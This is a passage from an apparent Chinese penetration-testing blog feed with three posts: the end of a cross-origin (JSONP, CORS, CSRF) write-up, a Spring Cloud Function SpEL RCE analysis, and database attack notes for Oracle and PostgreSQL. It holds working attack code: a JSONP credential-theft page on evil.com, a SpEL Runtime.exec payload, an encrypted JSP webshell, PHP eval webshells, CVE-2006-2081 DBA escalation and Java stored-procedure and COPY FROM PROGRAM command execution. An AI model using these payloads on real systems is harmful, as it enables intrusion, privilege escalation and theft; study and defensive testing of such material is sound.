class="line">&lt;iframe id=<span class="string">&quot;iframe&quot;</span> src=<span class="string">&quot;//evoa.me/1.php&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><h3 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h3><p>上面讲过<code>&lt;script&gt;</code>标签可以跨域加载资源，但是返回内容如果不符合JS语法同样无法获取数据，JSONP则是通过返回符合JS语法的数据内容使资源能够跨域加载</p><p><strong>aaa.evoa.me&#x2F;1.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="function"><span class="keyword">function</span> <span class="title">echoData</span>(<span class="params">data</span>) </span>&#123;    console.<span class="title function_ invoke__">log</span>(<span class="string">&quot;DATA: &quot;</span>, data);&#125;&lt;/script&gt;&lt;script src=<span class="string">&quot;//bbb.evoa.me/2.php?func=echoData&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>bbb.evoa.me&#x2F;2.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>header(<span class="string">&#x27;Content-type: application/javascript&#x27;</span>);<span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;func&#x27;</span>] ?? <span class="string">&quot;func&quot;</span>;<span class="variable">$data</span> = <span class="string">&#x27;[&quot;aaa&quot;,&quot;bbb&quot;,&quot;ccc&quot;,&quot;ddd&quot;]&#x27;</span>;<span class="keyword">echo</span> <span class="variable">$func</span> . <span class="string">&quot;(&quot;</span> . <span class="variable">$data</span> . <span class="string">&quot;)&quot;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>即<code>1.php</code>页面先设定好输出数据的函数，通过<code>&lt;script&gt;</code>标签请求<code>2.php</code>并带有函数名参数，<code>2.php</code>把数据当函数参数传入并根据函数名输出对应函数调用语句，<code>1.php</code>获得响应后自动调用函数即可获取数据</p><p>本来一个极其巧妙的数据传输方式，但如果配置有问题，则可能产生安全隐患，假如一个没有任何验证的JSONP接口，用来传输用户的敏感数据。</p><p><strong>evoa.me&#x2F;2.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>header(<span class="string">&#x27;Content-type: application/javascript&#x27;</span>);<span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;func&#x27;</span>] ?? <span class="string">&quot;func&quot;</span>;<span class="variable">$data</span> = <span class="string">&quot;&#123;&#x27;username&#x27;:&#x27;evoA&#x27;,&#x27;password&#x27;:&#x27;123456789&#x27;&#125;&quot;</span>;<span class="keyword">echo</span> <span class="variable">$func</span> . <span class="string">&quot;(&quot;</span> . <span class="variable">$data</span> . <span class="string">&quot;)&quot;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>evil.com&#x2F;evil.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="function"><span class="keyword">function</span> <span class="title">echoData</span>(<span class="params">data</span>) </span>&#123;    <span class="title function_ invoke__">alert</span>(<span class="string">&quot;username: &quot;</span> + data.username + <span class="string">&quot;\n&quot;</span> + <span class="string">&quot;password: &quot;</span>+ data.password);&#125;&lt;/script&gt;&lt;script src=<span class="comment">//evoa.me/2.php?func=echoData&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>如果未设置Content-type，会发生什么？</p><p><strong>未设置Conten-type可以导致反射性XSS</strong></p><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>比如说，假如站点 <code>https://foo.example</code> 的网页应用想要访问 <code>https://bar.other</code> 的资源。<code>foo.example</code> 的网页中可能包含类似于下面的 JavaScript 代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();<span class="keyword">const</span> url = <span class="string">&#x27;https://bar.other/resources/public-data/&#x27;</span>;xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, url);xhr.<span class="property">onreadystatechange</span> = someHandler;xhr.<span class="title function_">send</span>();</span><br></pre></td></tr></table></figure><p>客户端和服务器之间使用 CORS 首部字段来处理权限：</p><hr><p>以下是浏览器发送给服务器的请求报文：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /resources/public-data/ HTTP/1.1Host: bar.otherUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip,deflateConnection: keep-aliveOrigin: https://foo.example</span><br></pre></td></tr></table></figure><p>请求首部字段 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Origin"><code>Origin</code></a> 表明该请求来源于 <code>http://foo.example</code>。</p><p>返回包如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OKDate: Mon, 01 Dec 2008 00:23:53 GMTServer: Apache/2Access-Control-Allow-Origin: *Keep-Alive: timeout=2, max=100Connection: Keep-AliveTransfer-Encoding: chunkedContent-Type: application/xml[XML Data]</span><br></pre></td></tr></table></figure><p>本例中，服务端返回的 <code>Access-Control-Allow-Origin: *</code> 表明，该资源可以被 <strong>任意</strong> 外域访问。</p><h2 id="CSRF的防御"><a href="#CSRF的防御" class="headerlink" title="CSRF的防御"></a>CSRF的防御</h2><p>emm，对于同源策略来看，我觉得主要还是为了防止<code>CSRF</code>的吧，所以说一说这里联系一起看一下。</p><ol><li><p><strong>增加验证码</strong></p><p>增加图形验证码或短信验证码等等，只有通过验证的请求才算合法。但是这种方案拥有两个局限性，一个是增加开发成本，另外一个是降低用户体验。</p></li><li><p><strong>cookies设置sameSite</strong></p><p>对于CSRF的第二个特点<code>伪造请求的域名不是网站A</code>,那么通过限制cookies不被其他域名网站使用,来达到防御的目的，具体的做法是</p><blockquote><p>cookies设置sameSite属性的值为strict，这样只有同源网站的请求才会带上cookies。但是此方案有浏览器兼容问题。</p></blockquote></li><li><p><strong>验证referer</strong></p><blockquote><p>后端可以根据HTTP请求头的<code>referer</code>来判断请求是否来自可信任网站。但是这个方案也有局限性，攻击者可以设置请求不携带referer，所以这个方案适合用于辅助。</p></blockquote></li><li><p><strong>验证csrf token</strong></p><p>这是目前相对成熟的方案之一，具体的做法是：</p><blockquote><p>服务端随机生成token，保存在服务端session中，同时保存到客户端中，客户端发送请求时，把token带到HTTP请求头或参数中，服务端接收到请求，验证请求中的token与session中的是否一致。</p></blockquote><p>这个方案适用于前后端不分离的项目和前后端分离的项目，对于前后端不分离的项目，token可以直接在编译模板的过程中写到表单的隐藏字段中，这样发送请求不需要额外的操作；而对于前后端分离的项目，token可以在登录时写入到cookies中，发送请求时，js读取cookies中的token，并设置到HTTP请求头中。</p></li><li><p><strong>更换登录态方案</strong></p></li></ol><p>   因为CSRF本质是伪造请求携带了保存在cookies中的信息，所以对<a href="https://so.csdn.net/so/search?q=session&spm=1001.2101.3001.7020">session</a>机制的登录态比较不利，如果更换JWT（JSON Web Token）方案，其token信息一般设置到HTTP头部的，所以可以防御CSRF攻击</p><ol start="6"><li>对开始的网站加一个一个 sign</li></ol><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/4470#toc-5">https://xz.aliyun.com/t/4470#toc-5</a></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS</a></p><p><a href="https://blog.csdn.net/weixin_39850143/article/details/112754637">https://blog.csdn.net/weixin_39850143/article/details/112754637</a></p>]]></content>
    
    
    <summary type="html">对跨域方式进行一个归纳梳理</summary>
    
    
    
    <category term="渗透测试" scheme="https://h0ld1rs.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="https://h0ld1rs.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SpringCloudFunction漏洞分析</title>
    <link href="https://h0ld1rs.github.io/posts/30687.html"/>
    <id>https://h0ld1rs.github.io/posts/30687.html</id>
    <published>2022-03-28T11:08:34.000Z</published>
    <updated>2022-04-01T06:43:46.588Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SpringCloudFunction漏洞分析"><a href="#SpringCloudFunction漏洞分析" class="headerlink" title="SpringCloudFunction漏洞分析"></a>SpringCloudFunction漏洞分析</h1><p>SpringCloudFunction是一个SpringBoot开发的Servless中间件（FAAS），支持基于SpEL的函数式动态路由。在特定配置下，3 &lt;&#x3D; 版本 &lt;&#x3D; 3.2.2（<code>commit dc5128b</code>之前）存在SpEL表达式执行导致的RCE。</p><p>在commit记录中找到</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220328223010.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在本次修复的时候，增加了<code>SimpleEvaluationContext</code></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220328223115.png"></p><p>这样就有了两个<code>EvaluationContext</code>，分别创建了两个对象</p><p>一个是<code>StandardEvaluationContext</code>，&#96;&#96;evalContext<code> 一个是</code>SimpleEvaluationContext<code>，</code> headerEvalContext&#96;</p><hr><p>接下来往下走，由<code>isViaHeader</code>变量作为flag，这时候，如果是从HTTP头取到了<code>spring.cloud.function.routing-expression</code>字段，就会设置一个<code>true</code>，这个<code>true</code>，就是接下来的<code>isViaHeader</code>属性</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220328225033.png"></p><p>在解析前判断<code>spring.cloud.function.routing-expression</code>的值是不是取自HTTP头，如果是的话就用<code>SimpleEvaluationContext</code>解析SpEL语句，不是来自外部输入时（比如<code>System.setProperty</code>）才用<code>StandardEvaluationContext</code>解析。</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220328224129.png"></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>测试版本：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># v3<span class="number">.2</span><span class="number">.0</span></span><br><span class="line">https:<span class="comment">//github.com/spring-cloud/spring-cloud-function/releases/tag/v3.2.0</span></span><br></pre></td></tr></table></figure><p>下载下来以后，将<code>spring-cloud-function-samples/function-sample-pojo</code>路径作为项目</p><h3 id="方式一-修改配置-任意路由"><a href="#方式一-修改配置-任意路由" class="headerlink" title="方式一(修改配置+任意路由)"></a>方式一(<strong>修改配置+任意路由</strong>)</h3><ol><li><p>修改配置文件，添加 如下内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spring.cloud.function.definition:functionRouter</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220329093343.png"></p></li><li><p>添加任意路由，构造<code>payload</code>即可</p><p><img src="C:\Users\12451\AppData\Roaming\Typora\typora-user-images\image-20220329093212235.png" alt="image-20220329093212235"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>)</span><br></pre></td></tr></table></figure></li></ol><h3 id="方法二-默认配置-特殊路由"><a href="#方法二-默认配置-特殊路由" class="headerlink" title="方法二(默认配置+特殊路由)"></a>方法二(默认配置+特殊路由)</h3><ol><li><p>默认配置</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220329093410.png"></p></li><li><p>特定的路由：&#x2F;functionRouter</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220329093534.png"></p></li><li><p>此刻，任意路由失效，必须在特定路由下才能加载</p></li></ol>]]></content>
    
    
    <summary type="html">对最近出现的 SPELCloudFunction进行一个分析</summary>
    
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>数据库相关</title>
    <link href="https://h0ld1rs.github.io/posts/61064.html"/>
    <id>https://h0ld1rs.github.io/posts/61064.html</id>
    <published>2022-03-26T13:26:04.000Z</published>
    <updated>2022-03-29T08:37:08.380Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数据库相关"><a href="#数据库相关" class="headerlink" title="数据库相关"></a>数据库相关</h1><p>以前没实操做过<code>oracle数据库</code>。只会mysql，，现在做一个简单的总结吧。。</p><h2 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a>oracle</h2><h3 id="写shell的条件"><a href="#写shell的条件" class="headerlink" title="写shell的条件"></a>写shell的条件</h3><ol><li>有DBA权限(剩下的connect权限之类的)</li><li>有网站的绝对路径</li></ol><h3 id="写入方法"><a href="#写入方法" class="headerlink" title="写入方法"></a>写入方法</h3><h4 id="储存过程写入"><a href="#储存过程写入" class="headerlink" title="储存过程写入"></a>储存过程写入</h4><p>首先我们需要创建一个ORACLE的目录对象指向某一路径，在真实环境中需要指向Web目录下，在这里我们将其指向&#x2F;home&#x2F;oracle这一路径下。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace directory WEBSHELL_DIR <span class="keyword">as</span> <span class="string">&#x27;C:\apache-tomcat-8.5.56\webapps\Shopping&#x27;</span>;</span><br></pre></td></tr></table></figure><p>然后利用存储过程写入一句话木马</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span></span><br><span class="line">   webshell_file utl_file.file_type;</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">   webshell_file :<span class="operator">=</span> utl_file.fopen(<span class="string">&#x27;WEBSHELL_DIR&#x27;</span>, <span class="string">&#x27;1.jsp&#x27;</span>, <span class="string">&#x27;W&#x27;</span>); </span><br><span class="line">   utl_file.put_line(webshell_file, <span class="string">&#x27;&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null)&#123;String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;&#125;Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;&#x27;</span>); </span><br><span class="line">   utl_file.fflush(webshell_file); </span><br><span class="line">   utl_file.fclose(webshell_file); </span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure><p>之后就可以写入成功</p><h4 id="利用数据库表空间结构写入文件"><a href="#利用数据库表空间结构写入文件" class="headerlink" title="利用数据库表空间结构写入文件"></a>利用数据库表空间结构写入文件</h4><p>创建表空间，根据文件大小可相应修改表空间</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span>space jsptest datafile <span class="string">&#x27;C:\apache-tomcat-8.5.56\webapps\Shopping\1.jsp&#x27;</span> size <span class="number">100</span>k nologging;</span><br></pre></td></tr></table></figure><p>创建表名并设置要插入字符的长度，此处先测试js代码，设置长度为100</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> webshell(C varchar2(<span class="number">100</span>)) tablespace jsptest;</span><br></pre></td></tr></table></figure><p>写入要执行的代码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> WEBSHELL <span class="keyword">values</span>(<span class="operator">&lt;</span>svg<span class="operator">/</span>onload<span class="operator">=</span>alert(<span class="number">1</span><span class="operator">&gt;</span><span class="string">&#x27;);</span></span><br></pre></td></tr></table></figure><p>然后提交数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">commit</span></span><br></pre></td></tr></table></figure><p>提交后必须同步数据至当前表空间</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span>space jsptest offline;</span><br></pre></td></tr></table></figure><p>删除表空间</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> tablespace jsptest including contents;</span><br></pre></td></tr></table></figure><h2 id="用户提权"><a href="#用户提权" class="headerlink" title="用户提权"></a>用户提权</h2><p>提升漏洞编号为CVE-2006-2081，漏洞成因由SYS用户运行的DBMS_EXPORT_EXTENSION存储过程存在PL&#x2F;SQL注入漏洞，允许低权限用户以DBA权限执行任意SQL代码，此项为Oracle 10g经典提权漏洞。</p><ol><li><p>先查询用户权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> user_role_privs;</span><br></pre></td></tr></table></figure></li><li><p>然后创建程序包</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">or</span> REPLACE</span><br><span class="line">PACKAGE HACKERPACKAGE AUTHID <span class="built_in">CURRENT_USER</span></span><br><span class="line"><span class="keyword">IS</span></span><br><span class="line"><span class="keyword">FUNCTION</span> ODCIIndexGetMetadata (oindexinfo SYS.odciindexinfo,P3 VARCHAR2,p4 VARCHAR2,env</span><br><span class="line">SYS.odcienv)</span><br><span class="line"><span class="keyword">RETURN</span> NUMBER;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure></li><li><p>创建程序包体</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">or</span> REPLACE PACKAGE BODY HACKERPACKAGE</span><br><span class="line"><span class="keyword">IS</span></span><br><span class="line"><span class="keyword">FUNCTION</span> ODCIIndexGetMetadata (oindexinfo SYS.odciindexinfo,P3 VARCHAR2,p4 VARCHAR2,env</span><br><span class="line">SYS.odcienv)</span><br><span class="line"><span class="keyword">RETURN</span> NUMBER</span><br><span class="line"><span class="keyword">IS</span></span><br><span class="line">pragma autonomous_transaction;</span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">EXECUTE</span> IMMEDIATE <span class="string">&#x27;GRANT DBA TO test&#x27;</span>;</span><br><span class="line"><span class="keyword">COMMIT</span>;</span><br><span class="line"><span class="keyword">RETURN</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="keyword">END</span>;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure></li><li><p>然后再次查看用户权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> user_role_privs;</span><br></pre></td></tr></table></figure></li></ol><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>因为java大多是以system权限运行，所以当oracle通过java获得命令执行权限时，便相当于间接获得了system权限，因此通过java权限命令执行也可以作为Oracle的提权过程</p><h3 id="利用java权限提权"><a href="#利用java权限提权" class="headerlink" title="利用java权限提权"></a>利用java权限提权</h3><ol><li><p>先使用dba权限赋予用户java运行权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grant</span> JAVASYSPRIV <span class="keyword">to</span> <span class="keyword">system</span></span><br></pre></td></tr></table></figure></li><li><p>写入java程序包</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xmlquery.newcontext(<span class="string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;</span><span class="string">&#x27;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=&quot;&quot;;while ((stemp = myReader.readLine()) != null) str +=stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#x27;</span><span class="string">&#x27;;commit;end;&#x27;</span>) from dual;</span><br></pre></td></tr></table></figure></li><li><p>获取<code>java</code>执行权限</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select dbms_xmlquery.newcontext(<span class="string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;</span><span class="string">&#x27;begin dbms_java.grant_permission( &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;SYSTEM&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;SYS:java.io.FilePermission&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;,&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;EXECUTE&#x27;</span><span class="string">&#x27;&#x27;</span><span class="string">&#x27;);end;&#x27;</span><span class="string">&#x27;commit;end;&#x27;</span>) from dual;</span><br></pre></td></tr></table></figure></li><li><p>创建执行命令的函数<code>select</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbms_xmlquery.newcontext(<span class="string">&#x27;declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate &#x27;&#x27;create or replace function shell(p_cmd in varchar2) return varchar2 as language java name &#x27;&#x27;&#x27;&#x27;LinxUtil.runCMD(java.lang.String) return String&#x27;&#x27;&#x27;&#x27;; &#x27;&#x27;;commit;end;&#x27;</span>) <span class="keyword">from</span> dual;</span><br></pre></td></tr></table></figure></li><li><p>执行命令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> shell(&quot;whoami&quot;) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure></li></ol><h3 id="利用储存过程提权"><a href="#利用储存过程提权" class="headerlink" title="利用储存过程提权"></a>利用储存过程提权</h3><p>oracle也可以利用存储过程来进行命令执行，当用户拥有创建存储过程权限时，则可以创建一个java class，然后用创建一个存储过程来进行调用</p><ol><li><p>查看权限发现用户具有create procedure权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> session_privs;</span><br></pre></td></tr></table></figure></li><li><p>创建一个<code>java class</code>然后用<code>procedure</code>包装进行调用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">and</span> resolve java source named CMD <span class="keyword">as</span></span><br><span class="line">    import java.lang.<span class="operator">*</span>;</span><br><span class="line">    import java.io.<span class="operator">*</span>;</span><br><span class="line">    public class CMD</span><br><span class="line">    &#123;</span><br><span class="line">       public <span class="keyword">static</span> void execmd(String command) throws IOException </span><br><span class="line">       &#123;</span><br><span class="line">               Runtime.getRuntime().<span class="keyword">exec</span>(command); </span><br><span class="line">       &#125; </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="operator">/</span></span><br></pre></td></tr></table></figure></li><li><p>创建储存过程</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">procedure</span> CMDPROC(command <span class="keyword">in</span> <span class="type">varchar</span>) <span class="keyword">as</span> <span class="keyword">language</span> java </span><br><span class="line">    name <span class="string">&#x27;CMD.execmd(java.lang.String)&#x27;</span>;</span><br><span class="line"><span class="operator">/</span></span><br></pre></td></tr></table></figure></li><li><p>执行命令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> CMDPROC()</span><br></pre></td></tr></table></figure></li></ol><h2 id="Postgresql"><a href="#Postgresql" class="headerlink" title="Postgresql"></a>Postgresql</h2><h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>直接利用copy函数将文件写入指定目录(需要已知绝对路径且对目录具有可操作权限)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid<span class="operator">=</span><span class="number">1</span>;<span class="keyword">copy</span> (<span class="keyword">select</span> <span class="string">&#x27;&lt;?php @eval(&quot;$_POST[cmd]&quot;);?&gt;&#x27;</span>) <span class="keyword">to</span> <span class="string">&#x27;C:\Users\test\Desktop\php\phpStudy\WWW\1.php&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>高权限命令执行漏洞CVE-2019-9193<br>从9.3版本开始，PostgreSQL实现了导入导出数据的命令“COPY TO&#x2F;FROM PROGRAM””，而此命令允许数据库超级用户以及“pg_read_server_files”组内用户执行上任意操作系统命令</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ol><li>postgresql数据库版本在9.3-11.2</li><li>执行数据库语句用户为超级用户或者“pg_read_server_files”组用户，pg_read_server_files角色权限可以执行copy命令，且此权限为11版本新增角色，11版本以下需要超级用户权限</li></ol><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>接下来开始命令执行步骤：<br>创建用来保存命令输出的表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> rce;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span>  rce(rce_output text);</span><br></pre></td></tr></table></figure><p>通过“COPY FROM PROGRAM”执行系统命令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COPY</span> rce <span class="keyword">FROM</span> PROGRAM <span class="string">&#x27;whoami&#x27;</span>;</span><br></pre></td></tr></table></figure><p>查看执行结果</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> rce;</span><br></pre></td></tr></table></figure><h2 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h2><h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><h5 id="into-oufile-写-shell"><a 